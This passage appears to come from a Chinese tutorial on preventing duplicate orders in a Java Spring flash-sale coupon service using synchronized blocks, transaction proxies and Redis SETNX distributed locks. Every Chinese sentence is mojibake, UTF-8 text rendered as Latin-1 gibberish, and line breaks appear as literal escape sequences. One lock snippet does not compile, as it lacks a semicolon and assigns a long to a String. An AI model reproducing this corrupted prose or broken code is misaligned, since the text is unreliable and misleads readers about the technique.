é”ï¼Œä½†æ˜¯ä¹è§‚é”æ¯”è¾ƒé€‚åˆæ›´æ–°æ•°æ®ï¼Œè€Œç°åœ¨æ˜¯æ’å…¥æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨æ‚²è§‚é”æ“ä½œ\n\n**æ³¨æ„ï¼š**åœ¨è¿™é‡Œæåˆ°äº†éå¸¸å¤šçš„é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦æ…¢æ…¢çš„æ¥æ€è€ƒï¼Œé¦–å…ˆå°†åˆå§‹æ–¹æ¡ˆå°è£…ä¸€ä¸ªcreateVoucherOrderæ–¹æ³•ï¼ŒåŒæ—¶ä¸ºäº†ç¡®ä¿ä»–çº¿ç¨‹å®‰å…¨ï¼Œåœ¨æ–¹æ³•ä¸Šæ·»åŠ äº†ä¸€æŠŠsynchronized é”\n\n```java\n@Transactional\npublic synchronized Result createVoucherOrder(Long voucherId) {\n\t\t\t\tLong userId = UserHolder.getUser().getId();\n          // 5.ä¸€äººä¸€å•é€»è¾‘\n         // 5.1.æŸ¥è¯¢è®¢å•\n        int count = query().eq(\"user_id\", userId).eq(\"voucher_id\", voucherId).count();\n        // 5.2.åˆ¤æ–­æ˜¯å¦å­˜åœ¨\n        if (count > 0) {\n            // ç”¨æˆ·å·²ç»è´­ä¹°è¿‡äº†\n            return Result.fail(\"ç”¨æˆ·å·²ç»è´­ä¹°è¿‡ä¸€æ¬¡ï¼\");\n        }\n\n        // 6.æ‰£å‡åº“å­˜\n        boolean success = seckillVoucherService.update()\n                .setSql(\"stock = stock - 1\") // set stock = stock - 1\n                .eq(\"voucher_id\", voucherId).gt(\"stock\", 0) // where id = ? and stock > 0\n                .update();\n        if (!success) {\n            // æ‰£å‡å¤±è´¥\n            return Result.fail(\"åº“å­˜ä¸è¶³ï¼\");\n        }\n\n        // 7.åˆ›å»ºè®¢å•\n        VoucherOrder voucherOrder = new VoucherOrder();\n        // 7.1.è®¢å•id\n        long orderId = redisIdWorker.nextId(\"order\");\n        voucherOrder.setId(orderId);\n        // 7.2.ç”¨æˆ·id\n        voucherOrder.setUserId(userId);\n        // 7.3.ä»£é‡‘åˆ¸id\n        voucherOrder.setVoucherId(voucherId);\n        save(voucherOrder);\n\n        // 7.è¿”å›è®¢å•id\n        return Result.ok(orderId);\n}\n```\n\nä½†æ˜¯è¿™æ ·æ·»åŠ é”ï¼Œé”çš„ç²’åº¦å¤ªç²—äº†ï¼Œåœ¨ä½¿ç”¨é”è¿‡ç¨‹ä¸­ï¼Œæ§åˆ¶**é”ç²’åº¦** æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„äº‹æƒ…ï¼Œå› ä¸ºå¦‚æœé”çš„ç²’åº¦å¤ªå¤§ï¼Œä¼šå¯¼è‡´æ¯ä¸ªçº¿ç¨‹è¿›æ¥éƒ½ä¼šé”ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å»æ§åˆ¶é”çš„ç²’åº¦ã€‚\n\nä»£ç éœ€è¦ä¿®æ”¹ä¸ºï¼š\nintern() è¿™ä¸ªæ–¹æ³•æ˜¯ä»å¸¸é‡æ± ä¸­æ‹¿åˆ°æ•°æ®ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ä½¿ç”¨userId.toString() æ‹¿åˆ°çš„å¯¹è±¡å®é™…ä¸Šæ˜¯ä¸åŒçš„å¯¹è±¡ï¼Œnewå‡ºæ¥çš„å¯¹è±¡ï¼Œæˆ‘ä»¬ä½¿ç”¨é”å¿…é¡»ä¿è¯é”å¿…é¡»æ˜¯åŒä¸€æŠŠï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨intern()æ–¹æ³•\n\n```java\n@Transactional\npublic  Result createVoucherOrder(Long voucherId) {\n\tLong userId = UserHolder.getUser().getId();\n\tsynchronized(userId.toString().intern()){\n         // 5.ä¸€äººä¸€å•é€»è¾‘\n         // 5.1.æŸ¥è¯¢è®¢å•\n        int count = query().eq(\"user_id\", userId).eq(\"voucher_id\", voucherId).count();\n        // 5.2.åˆ¤æ–­æ˜¯å¦å­˜åœ¨\n        if (count > 0) {\n            // ç”¨æˆ·å·²ç»è´­ä¹°è¿‡äº†\n            return Result.fail(\"ç”¨æˆ·å·²ç»è´­ä¹°è¿‡ä¸€æ¬¡ï¼\");\n        }\n\n        // 6.æ‰£å‡åº“å­˜\n        boolean success = seckillVoucherService.update()\n                .setSql(\"stock = stock - 1\") // set stock = stock - 1\n                .eq(\"voucher_id\", voucherId).gt(\"stock\", 0) // where id = ? and stock > 0\n                .update();\n        if (!success) {\n            // æ‰£å‡å¤±è´¥\n            return Result.fail(\"åº“å­˜ä¸è¶³ï¼\");\n        }\n\n        // 7.åˆ›å»ºè®¢å•\n        VoucherOrder voucherOrder = new VoucherOrder();\n        // 7.1.è®¢å•id\n        long orderId = redisIdWorker.nextId(\"order\");\n        voucherOrder.setId(orderId);\n        // 7.2.ç”¨æˆ·id\n        voucherOrder.setUserId(userId);\n        // 7.3.ä»£é‡‘åˆ¸id\n        voucherOrder.setVoucherId(voucherId);\n        save(voucherOrder);\n\n        // 7.è¿”å›è®¢å•id\n        return Result.ok(orderId);\n    }\n}\n```\n\nä½†æ˜¯ä»¥ä¸Šä»£ç è¿˜æ˜¯å­˜åœ¨é—®é¢˜ï¼Œé—®é¢˜çš„åŸå› åœ¨äºå½“å‰æ–¹æ³•è¢«springçš„äº‹åŠ¡æ§åˆ¶ï¼Œå¦‚æœä½ åœ¨æ–¹æ³•å†…éƒ¨åŠ é”ï¼Œå¯èƒ½ä¼šå¯¼è‡´å½“å‰æ–¹æ³•äº‹åŠ¡è¿˜æ²¡æœ‰æäº¤ï¼Œä½†æ˜¯é”å·²ç»é‡Šæ”¾ä¹Ÿä¼šå¯¼è‡´é—®é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©å°†å½“å‰æ–¹æ³•æ•´ä½“åŒ…è£¹èµ·æ¥ï¼Œç¡®ä¿äº‹åŠ¡ä¸ä¼šå‡ºç°é—®é¢˜ã€‚åœ¨seckillVoucher æ–¹æ³•ä¸­ï¼Œæ·»åŠ ä»¥ä¸‹é€»è¾‘ï¼Œè¿™æ ·å°±èƒ½ä¿è¯äº‹åŠ¡çš„ç‰¹æ€§ï¼ŒåŒæ—¶ä¹Ÿæ§åˆ¶äº†é”çš„ç²’åº¦\n\n```java\n@Override\npublic Result seckillVoucher(Long voucherId) {\n    //....\n    Long userId = UserHolder.getUser().getId();\n    synchronized(userId.toString().intern()){\n      return this.createVoucherOrder(voucherId);\n    }\n}\n```\n\nä½†æ˜¯ä»¥ä¸Šåšæ³•ä¾ç„¶æœ‰é—®é¢˜ï¼Œå› ä¸ºä½ è°ƒç”¨çš„æ–¹æ³•ï¼Œå…¶å®æ˜¯`this.`çš„æ–¹å¼è°ƒç”¨çš„ï¼Œäº‹åŠ¡æƒ³è¦ç”Ÿæ•ˆï¼Œè¿˜å¾—åˆ©ç”¨ä»£ç†æ¥ç”Ÿæ•ˆï¼Œæ‰€ä»¥è¿™ä¸ªåœ°æ–¹ï¼Œæˆ‘ä»¬éœ€è¦è·å¾—åŸå§‹çš„äº‹åŠ¡å¯¹è±¡ï¼Œ æ¥æ“ä½œäº‹åŠ¡\n\n```java\n@Override\npublic Result seckillVoucher(Long voucherId) {\n    //....\n  Long userId = UserHolder.getUser().getId();\n  synchronized (userId.toString().intern()) {\n    IVoucherOrderService proxy = (IVoucherOrderService) AopContext.currentProxy();\n    return proxy.createVoucherOrder(voucherId);\n  }\n}\n```\n\néœ€è¦æ·»åŠ ä¾èµ–å’Œæ³¨è§£\n\n```xml\n<dependency>\n  <groupId>org.aspectj</groupId>\n  <artifactId>aspectjweaver</artifactId>\n</dependency>\n```\n\n```java\n@EnableAspectJAutoProxy(exposeProxy = true) //æ·»åŠ è¿™ä¸€æ¡\n@MapperScan(\"com.kbdp.mapper\")\n@SpringBootApplication\npublic class KbDianPingApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(KbDianPingApplication.class, args);\n    }\n}\n```\n\n## â¼é›†ç¾¤ç¯å¢ƒä¸‹çš„å¹¶å‘é—®é¢˜\n\né€šè¿‡åŠ é”å¯ä»¥è§£å†³åœ¨å•æœºæƒ…å†µä¸‹çš„ä¸€äººä¸€å•å®‰å…¨é—®é¢˜ï¼Œä½†æ˜¯åœ¨é›†ç¾¤æ¨¡å¼ä¸‹å°±ä¸è¡Œäº†ã€‚\n\n1ã€æˆ‘ä»¬å°†æœåŠ¡å¯åŠ¨ä¸¤ä»½ï¼Œç«¯å£åˆ†åˆ«ä¸º8081å’Œ8082ï¼š\n\n![](https://img.jwt1399.top/img/202211262006305.png)\n\n2ã€ç„¶åä¿®æ”¹nginxçš„confç›®å½•ä¸‹çš„nginx.confæ–‡ä»¶ï¼Œé…ç½®åå‘ä»£ç†å’Œè´Ÿè½½å‡è¡¡ï¼š\n\n![](https://img.jwt1399.top/img/202211262006090.png)\n\n**æœ‰å…³é”å¤±æ•ˆåŸå› åˆ†æ**\n\nç”±äºç°åœ¨æˆ‘ä»¬éƒ¨ç½²äº†å¤šä¸ªtomcatï¼Œæ¯ä¸ªtomcatéƒ½æœ‰ä¸€ä¸ªå±äºè‡ªå·±çš„jvmï¼Œé‚£ä¹ˆå‡è®¾åœ¨æœåŠ¡å™¨Açš„tomcatå†…éƒ¨ï¼Œæœ‰ä¸¤ä¸ªçº¿ç¨‹ï¼Œè¿™ä¸¤ä¸ªçº¿ç¨‹ç”±äºä½¿ç”¨çš„æ˜¯åŒä¸€ä»½ä»£ç ï¼Œé‚£ä¹ˆä»–ä»¬çš„é”å¯¹è±¡æ˜¯åŒä¸€ä¸ªï¼Œæ˜¯å¯ä»¥å®ç°äº’æ–¥çš„ï¼Œä½†æ˜¯å¦‚æœç°åœ¨æ˜¯æœåŠ¡å™¨Bçš„tomcatå†…éƒ¨ï¼Œåˆæœ‰ä¸¤ä¸ªçº¿ç¨‹ï¼Œä½†æ˜¯ä»–ä»¬çš„é”å¯¹è±¡å†™çš„è™½ç„¶å’ŒæœåŠ¡å™¨Aä¸€æ ·ï¼Œä½†æ˜¯é”å¯¹è±¡å´ä¸æ˜¯åŒä¸€ä¸ªï¼Œæ‰€ä»¥çº¿ç¨‹3å’Œçº¿ç¨‹4å¯ä»¥å®ç°äº’æ–¥ï¼Œä½†æ˜¯å´æ— æ³•å’Œçº¿ç¨‹1å’Œçº¿ç¨‹2å®ç°äº’æ–¥ï¼Œè¿™å°±æ˜¯é›†ç¾¤ç¯å¢ƒä¸‹ï¼Œsyné”å¤±æ•ˆçš„åŸå› ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨åˆ†å¸ƒå¼é”æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚\n\n![](https://img.jwt1399.top/img/202211262007757.png)\n\n# â‘£åˆ†å¸ƒå¼é”\n\n## â¶åŸºæœ¬åŸç†\n\nåˆ†å¸ƒå¼é”ï¼šæ»¡è¶³åˆ†å¸ƒå¼ç³»ç»Ÿæˆ–é›†ç¾¤æ¨¡å¼ä¸‹å¤šè¿›ç¨‹å¯è§å¹¶ä¸”äº’æ–¥çš„é”ã€‚\n\nåˆ†å¸ƒå¼é”çš„æ ¸å¿ƒæ€æƒ³ï¼šè®©å¤§å®¶éƒ½ä½¿ç”¨åŒä¸€æŠŠé”ï¼Œåªè¦å¤§å®¶ä½¿ç”¨çš„æ˜¯åŒä¸€æŠŠé”ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½é”ä½çº¿ç¨‹ï¼Œä¸è®©çº¿ç¨‹è¿›è¡Œï¼Œè®©ç¨‹åºä¸²è¡Œæ‰§è¡Œï¼Œè¿™å°±æ˜¯åˆ†å¸ƒå¼é”çš„æ ¸å¿ƒæ€è·¯\n\n![](https://img.jwt1399.top/img/202211262012190.png)\n\nåˆ†å¸ƒå¼é”åº”è¯¥æ»¡è¶³ä»€ä¹ˆæ ·çš„æ¡ä»¶å‘¢ï¼Ÿ\n\n![](https://img.jwt1399.top/img/202211262011958.png)\n\n- å¯è§æ€§ï¼šå¤šä¸ªçº¿ç¨‹éƒ½èƒ½çœ‹åˆ°ç›¸åŒçš„ç»“æœ\n\n- äº’æ–¥ï¼šäº’æ–¥æ˜¯åˆ†å¸ƒå¼é”çš„æœ€åŸºæœ¬çš„æ¡ä»¶ï¼Œä½¿å¾—ç¨‹åºä¸²è¡Œæ‰§è¡Œ\n\n- é«˜å¯ç”¨ï¼šç¨‹åºä¸æ˜“å´©æºƒï¼Œæ—¶æ—¶åˆ»åˆ»éƒ½ä¿è¯è¾ƒé«˜çš„å¯ç”¨æ€§\n\n- é«˜æ€§èƒ½ï¼šç”±äºåŠ é”æœ¬èº«å°±è®©æ€§èƒ½é™ä½ï¼Œæ‰€æœ‰å¯¹äºåˆ†å¸ƒå¼é”æœ¬èº«éœ€è¦ä»–å°±è¾ƒé«˜çš„åŠ é”æ€§èƒ½å’Œé‡Šæ”¾é”æ€§èƒ½\n\n- å®‰å…¨æ€§ï¼šå®‰å…¨ä¹Ÿæ˜¯ç¨‹åºä¸­å¿…ä¸å¯å°‘çš„ä¸€ç¯\n\nå¸¸è§çš„åˆ†å¸ƒå¼é”æœ‰ä¸‰ç§\n\n- Mysqlï¼šmysqlæœ¬èº«å°±å¸¦æœ‰é”æœºåˆ¶ï¼Œä½†æ˜¯ç”±äºmysqlæ€§èƒ½æœ¬èº«ä¸€èˆ¬ï¼Œæ‰€ä»¥åˆ†å¸ƒå¼é”çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨mysqlä½œä¸ºåˆ†å¸ƒå¼é”æ¯”è¾ƒå°‘è§\n\n- Redisï¼šç°åœ¨ä¼ä¸šçº§å¼€å‘ä¸­åŸºæœ¬éƒ½ä½¿ç”¨redisæˆ–è€…zookeeperä½œä¸ºåˆ†å¸ƒå¼é”ï¼Œredisåˆ©ç”¨setnxæ–¹æ³•ï¼Œå¦‚æœæ’å…¥keyæˆåŠŸï¼Œè¡¨ç¤ºè·å¾—åˆ°äº†é”ï¼Œå¦‚æœæœ‰äººæ’å…¥æˆåŠŸï¼Œå…¶ä»–äººæ’å…¥å¤±è´¥è¡¨ç¤ºæ— æ³•è·å¾—åˆ°é”ï¼Œåˆ©ç”¨è¿™å¥—é€»è¾‘æ¥å®ç°åˆ†å¸ƒå¼é”\n\n- Zookeeperï¼šzookeeperä¹Ÿæ˜¯ä¼ä¸šçº§å¼€å‘ä¸­è¾ƒå¥½çš„ä¸€ä¸ªå®ç°åˆ†å¸ƒå¼é”çš„æ–¹æ¡ˆ\n\n![](https://img.jwt1399.top/img/202211262015600.png)\n\n## â·Redisåˆ†å¸ƒå¼é”å®ç°æ€è·¯\n\nå®ç°åˆ†å¸ƒå¼é”æ—¶éœ€è¦å®ç°çš„ä¸¤ä¸ªåŸºæœ¬æ–¹æ³•ï¼š\n\n* è·å–é”ï¼š\n\n  * äº’æ–¥ï¼šç¡®ä¿åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹è·å–é”\n  * éé˜»å¡ï¼šå°è¯•ä¸€æ¬¡ï¼ŒæˆåŠŸè¿”å›trueï¼Œå¤±è´¥è¿”å›false\n\n```sql\n# æ·»åŠ é”ï¼ŒNXæ˜¯äº’æ–¥ EXæ˜¯è®¾ç½®è¶…æ—¶æ—¶é—´\nSET Lock threadl EX 10 NX\n```\n\n```sql\n# ä¸Šé¢å‘½ä»¤æ˜¯ä¸‹é¢ä¸¤æ¡å‘½ä»¤çš„ç»“åˆ\n# ä¸Šé¢å‘½ä»¤æ˜¯ä¸‹é¢ä¸¤æ¡å‘½ä»¤çš„åŒæ—¶æ‰§è¡Œï¼Œä¸ºäº†ä¿è¯åŸå­æ€§ï¼Œé˜²æ­¢åº”ä¸ºrediså®•æœºï¼Œå¯¼è‡´é”®æ— æ³•åˆ é™¤\n\n# æ·»åŠ é”ï¼Œåˆ©ç”¨setnxçš„äº’æ–¥ç‰¹æ€§\nSETNX lock thread1\n\n# æ·»åŠ é”è¿‡æœŸæ—¶é—´ï¼Œé¿å…æœåŠ¡å®•æœºå¼•èµ·çš„æ­»é”\nEXPIRE lock 10\n```\n\n* é‡Šæ”¾é”ï¼š\n  * æ‰‹åŠ¨é‡Šæ”¾\n  * è¶…æ—¶é‡Šæ”¾ï¼šè·å–é”æ—¶æ·»åŠ ä¸€ä¸ªè¶…æ—¶æ—¶é—´\n\n\n```sql\n# é‡Šæ”¾é”ï¼Œåˆ é™¤å³å¯\nDEL key\n```\n\næ ¸å¿ƒæ€è·¯ï¼šåˆ©ç”¨ redis çš„ SETNX æ–¹æ³•ï¼Œå½“æœ‰å¤šä¸ªçº¿ç¨‹è¿›å…¥æ—¶ï¼Œæˆ‘ä»¬å°±åˆ©ç”¨è¯¥æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªçº¿ç¨‹è¿›å…¥æ—¶ï¼Œredis ä¸­å°±æœ‰è¿™ä¸ªkeyäº†ï¼Œè¿”å›äº†1ï¼Œå¦‚æœç»“æœæ˜¯1ï¼Œåˆ™è¡¨ç¤ºä»–æŠ¢åˆ°äº†é”ï¼Œé‚£ä¹ˆä»–å»æ‰§è¡Œä¸šåŠ¡ï¼Œç„¶åå†åˆ é™¤é”ï¼Œé€€å‡ºé”é€»è¾‘ï¼Œæ²¡æœ‰æŠ¢åˆ°é”çš„ç­‰å¾…ä¸€å®šæ—¶é—´åé‡è¯•å³å¯\n\n<img src=\"https://img.jwt1399.top/img/202211262049701.png\"  style=\"zoom: 50%;\" />\n\n## â¸å®ç°åˆ†å¸ƒå¼é”åˆçº§ç‰ˆæœ¬\n\n> éœ€æ±‚ï¼šå®šä¹‰ä¸€ä¸ªç±»ï¼Œå®ç°ä¸‹é¢æ¥å£ï¼Œåˆ©ç”¨Rediså®ç°åˆ†å¸ƒå¼é”åŠŸèƒ½ã€‚\n\n```java\npublic interface ILock {\n  /**  \n   * å°è¯•è·å–é”    \n   * @param timeoutSec é”æŒæœ‰çš„è¶…æ—¶æ—¶é—´ï¼Œè¿‡æœŸåè‡ªåŠ¨é‡Šæ”¾ \n   * @return trueä»£è¡¨è·å–é”æˆåŠŸ; falseä»£è¡¨è·å–é”å¤±è´¥   \n   */   \n  boolean tryLock(long timeoutSec);\n  /**\n   * é‡Šæ”¾é”  \n   */  \n  void unlock();\n}\n```\n\n- å®ç°ç±»\n\n```java\npublic class SimpleRedisLock implements ILock{\n  \n    private String name; //æœåŠ¡åç§°ä½œä¸ºé”®\n    private StringRedisTemplate stringRedisTemplate;\n\n    public SimpleRedisLock(String name, StringRedisTemplate stringRedisTemplate) {\n        this.name = name;\n        this.stringRedisTemplate = stringRedisTemplate;\n    }\n\n    @Override\n    public boolean tryLock(long timeoutSec) {\n        return false;\n    }\n\n    @Override\n    public void unlock() {\n\n    }\n}\n\n```\n\n- è·å–é”ï¼šåˆ©ç”¨setnxæ–¹æ³•è¿›è¡ŒåŠ é”ï¼ŒåŒæ—¶å¢åŠ è¿‡æœŸæ—¶é—´ï¼Œé˜²æ­¢æ­»é”ï¼Œå¯ä»¥ä¿è¯åŠ é”å’Œå¢åŠ è¿‡æœŸæ—¶é—´å…·æœ‰åŸå­æ€§\n\n```java\nprivate static final String KEY_PREFIX=\"lock:\";\n@Override\npublic boolean tryLock(long timeoutSec) {\n    // è·å–çº¿ç¨‹æ ‡ç¤ºä½œä¸ºå€¼\n    String threadId = Thread.currentThread().getId()\n    // è·å–é”\n    Boolean success = stringRedisTemplate.opsForValue()\n            .setIfAbsent(KEY_PREFIX + name, threadId + \"\", timeoutSec, TimeUnit.SECONDS);\n    return Boolean.TRUE.equals(success); //é¿å…è‡ªåŠ¨æ‹†ç®±ç©ºæŒ‡é’ˆ\n}\n```\n\n* é‡Šæ”¾é”é‡Šï¼šé˜²æ­¢åˆ é™¤åˆ«äººçš„é”\n\n```java\npublic void unlock() {\n    //é€šè¿‡delåˆ é™¤é”\n    stringRedisTemplate.delete(KEY_PREFIX + name);\n}\n```\n\n* ä¿®æ”¹ä¸šåŠ¡ä»£ç \n\n```java\n@Override\npublic Result seckillVoucher(Long voucherId) {\n    // 1.æŸ¥è¯¢ä¼˜æƒ åˆ¸\n    SeckillVoucher voucher = seckillVoucherService.getById(voucherId);\n    // 2.åˆ¤æ–­ç§’æ€æ˜¯å¦å¼€å§‹\n    if (voucher.getBeginTime().isAfter(LocalDateTime.now())) {\n      // å°šæœªå¼€å§‹\n      return Result.fail(\"ç§’æ€å°šæœªå¼€å§‹ï¼\");\n    }\n    // 3.åˆ¤æ–­ç§’æ€æ˜¯å¦å·²ç»ç»“æŸ\n    if (voucher.getEndTime().isBefore(LocalDateTime.now())) {\n      // å°šæœªå¼€å§‹\n      return Result.fail(\"ç§’æ€å·²ç»ç»“æŸï¼\");\n    }\n    // 4.åˆ¤æ–­åº“å­˜æ˜¯å¦å……è¶³\n    if (voucher.getStock() < 1) {\n      // åº“å­˜ä¸è¶³\n      return Result.fail(\"åº“å­˜ä¸è¶³ï¼\");\n    }\n    Long userId = UserHolder.getUser().getId();\n    //åˆ›å»ºé”å¯¹è±¡(æ–°å¢ä»£ç )\n    SimpleRedisLock lock = new SimpleRedisLock(\"order:\" + userId, stringRedisTemplate);\n    //è·å–é”å¯¹è±¡\n    boolean isLock = lock.tryLock(1200);\n    //åŠ é”å¤±è´¥\n    if (!isLock) {\n      return Result.fail(\"ä¸å…è®¸é‡å¤ä¸‹å•\");\n    }\n    try {\n      //è·å–ä»£ç†å¯¹è±¡(äº‹åŠ¡)\n      IVoucherOrderService proxy = (IVoucherOrderService) AopContext.currentProxy();\n      return proxy.createVoucherOrder(voucherId);\n    } finally {\n      //é‡Šæ”¾é”\n      lock.unlock();\n    }\n}\n```\n\n## â¹Redisåˆ†å¸ƒå¼é”è¯¯åˆ é—®é¢˜\n\n**é—®é¢˜æè¿°**ï¼šæŒæœ‰é”çš„çº¿ç¨‹åœ¨é”çš„å†…éƒ¨å‡ºç°äº†é˜»å¡ï¼Œå¯¼è‡´ä»–çš„é”è¶…æ—¶è‡ªåŠ¨é‡Šæ”¾ï¼Œè¿™æ—¶å…¶ä»–çº¿ç¨‹ï¼Œçº¿ç¨‹2æ¥å°è¯•è·å¾—é”ï¼Œå°±æ‹¿åˆ°äº†è¿™æŠŠé”ï¼Œç„¶åçº¿ç¨‹2åœ¨æŒæœ‰é”æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œçº¿ç¨‹1ååº”è¿‡æ¥ï¼Œç»§ç»­æ‰§è¡Œï¼Œè€Œçº¿ç¨‹1æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œèµ°åˆ°äº†åˆ é™¤é”é€»è¾‘ï¼Œæ­¤æ—¶å°±ä¼šæŠŠæœ¬åº”è¯¥å±äºçº¿ç¨‹2çš„é”è¿›è¡Œåˆ é™¤ï¼Œè¿™å°±æ˜¯è¯¯åˆ åˆ«äººé”çš„æƒ…å†µè¯´æ˜\n\n![](https://img.jwt1399.top/img/202211262127536.png)\n\n**è§£å†³æ–¹æ¡ˆ**ï¼šè§£å†³æ–¹æ¡ˆå°±æ˜¯åœ¨æ¯ä¸ªçº¿ç¨‹é‡Šæ”¾é”çš„æ—¶å€™ï¼Œå»åˆ¤æ–­ä¸€ä¸‹å½“å‰è¿™æŠŠé”æ˜¯å¦å±äºè‡ªå·±ï¼Œå¦‚æœå±äºè‡ªå·±ï¼Œåˆ™ä¸è¿›è¡Œé”çš„åˆ é™¤ï¼Œå‡è®¾è¿˜æ˜¯ä¸Šè¾¹çš„æƒ…å†µï¼Œçº¿ç¨‹1å¡é¡¿ï¼Œé”è‡ªåŠ¨é‡Šæ”¾ï¼Œçº¿ç¨‹2è¿›å…¥åˆ°é”çš„å†…éƒ¨æ‰§è¡Œé€»è¾‘ï¼Œæ­¤æ—¶çº¿ç¨‹1ååº”è¿‡æ¥ï¼Œç„¶ååˆ é™¤é”ï¼Œä½†æ˜¯çº¿ç¨‹1ï¼Œä¸€çœ‹å½“å‰è¿™æŠŠé”ä¸æ˜¯å±äºè‡ªå·±ï¼Œäºæ˜¯ä¸è¿›è¡Œåˆ é™¤é”é€»è¾‘ï¼Œå½“çº¿ç¨‹2èµ°åˆ°åˆ é™¤é”é€»è¾‘æ—¶ï¼Œå¦‚æœæ²¡æœ‰å¡è¿‡è‡ªåŠ¨é‡Šæ”¾é”çš„æ—¶é—´ç‚¹ï¼Œåˆ™åˆ¤æ–­å½“å‰è¿™æŠŠé”æ˜¯å±äºè‡ªå·±çš„ï¼Œäºæ˜¯åˆ é™¤è¿™æŠŠé”ã€‚\n\n![](https://img.jwt1399.top/img/202211262127624.png)\n\n## âºè§£å†³åˆ†å¸ƒå¼é”è¯¯åˆ é—®é¢˜\n\nä¿®æ”¹ä¹‹å‰çš„åˆ†å¸ƒå¼é”å®ç°ä½¿å…¶æ»¡è¶³ï¼šåœ¨è·å–é”æ—¶å­˜å…¥çº¿ç¨‹æ ‡ç¤ºï¼ˆå¯ä»¥ç”¨UUIDè¡¨ç¤ºï¼‰ï¼Œåœ¨é‡Šæ”¾é”æ—¶å…ˆè·å–é”ä¸­çš„çº¿ç¨‹æ ‡ç¤ºï¼Œåˆ¤æ–­æ˜¯å¦ä¸å½“å‰çº¿ç¨‹æ ‡ç¤ºä¸€è‡´\n\n* å¦‚æœä¸€è‡´åˆ™é‡Šæ”¾é”\n* å¦‚æœä¸ä¸€è‡´åˆ™ä¸é‡Šæ”¾é”\n\næ ¸å¿ƒé€»è¾‘ï¼šåœ¨å­˜å…¥é”æ—¶ï¼Œæ”¾å…¥è‡ªå·±çº¿ç¨‹çš„æ ‡è¯†ï¼Œåœ¨åˆ é™¤é”æ—¶ï¼Œåˆ¤æ–­å½“å‰è¿™æŠŠé”çš„æ ‡è¯†æ˜¯ä¸æ˜¯è‡ªå·±å­˜å…¥çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿›è¡Œåˆ é™¤ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™ä¸è¿›è¡Œåˆ é™¤ã€‚\n\n<img src=\"https://img.jwt1399.top/img/202211262127471.png\" style=\"zoom:50%;\" />\n\n- è·å–é”\n\n```java\nprivate static final String ID_PREFIX = UUID.randomUUID().toString(true) + \"-\";\nprivate static final String KEY_PREFIX=\"lock:\";\n@Override\npublic boolean tryLock(long timeoutSec) {\n   // è·å–çº¿ç¨‹æ ‡ç¤º\n   String threadId = ID_PREFIX + Thread.currentThread().getId();\n   // è·å–é”\n   Boolean success = stringRedisTemplate.opsForValue()\n                .setIfAbsent(KEY_PREFIX + name, threadId, timeoutSec, TimeUnit.SECONDS);\n   return Boolean.TRUE.equals(success);\n}\n```\n\n- é‡Šæ”¾é”\n\n```java\n@Override\npublic void unlock() {\n    // è·å–çº¿ç¨‹æ ‡ç¤º\n    String threadId = ID_PREFIX + Thread.currentThread().getId();\n    // è·å–é”ä¸­çš„æ ‡ç¤º\n    String id = stringRedisTemplate.opsForValue().get(KEY_PREFIX + name);\n    // åˆ¤æ–­æ ‡ç¤ºæ˜¯å¦ä¸€è‡´\n    if(threadId.equals(id)) {\n        // é‡Šæ”¾é”\n        stringRedisTemplate.delete(KEY_PREFIX + name);\n    }\n}\n```\n\n**æµ‹è¯•ï¼š**åœ¨æˆ‘ä»¬ä¿®æ”¹å®Œæ­¤å¤„ä»£ç åï¼Œé‡å¯å·¥ç¨‹ï¼Œç„¶åå¯åŠ¨ä¸¤ä¸ªçº¿ç¨‹ï¼Œç¬¬ä¸€ä¸ªçº¿ç¨‹æŒæœ‰é”åï¼Œæ‰‹åŠ¨é‡Šæ”¾é”ï¼Œç¬¬äºŒä¸ªçº¿ç¨‹ æ­¤æ—¶è¿›å…¥åˆ°é”å†…éƒ¨ï¼Œå†æ”¾è¡Œç¬¬ä¸€ä¸ªçº¿ç¨‹ï¼Œæ­¤æ—¶ç¬¬ä¸€ä¸ªçº¿ç¨‹ç”±äºé”çš„valueå€¼å¹¶éæ˜¯è‡ªå·±ï¼Œæ‰€ä»¥ä¸èƒ½é‡Šæ”¾é”ï¼Œä¹Ÿå°±æ— æ³•åˆ é™¤åˆ«äººçš„é”ï¼Œæ­¤æ—¶ç¬¬äºŒä¸ªçº¿ç¨‹èƒ½å¤Ÿæ­£ç¡®é‡Šæ”¾é”ï¼Œé€šè¿‡è¿™ä¸ªæ¡ˆä¾‹åˆæ­¥è¯´æ˜æˆ‘ä»¬è§£å†³äº†é”è¯¯åˆ çš„é—®é¢˜ã€‚\n\n## â»åˆ†å¸ƒå¼é”çš„åŸå­æ€§é—®é¢˜\n\næ›´ä¸ºæç«¯çš„è¯¯åˆ é—®é¢˜ï¼šçº¿ç¨‹1ç°åœ¨æŒæœ‰é”ä¹‹åï¼Œåœ¨æ‰§è¡Œä¸šåŠ¡é€»è¾‘è¿‡ç¨‹ä¸­ï¼Œä»–æ­£å‡†å¤‡åˆ é™¤é”ï¼Œè€Œä¸”å·²ç»èµ°åˆ°äº†æ¡ä»¶åˆ¤æ–­çš„è¿‡ç¨‹ä¸­ï¼Œæ¯”å¦‚å½“å‰è¿™æŠŠé”ç¡®å®æ˜¯å±äºä»–è‡ªå·±çš„ï¼Œæ­£å‡†å¤‡åˆ 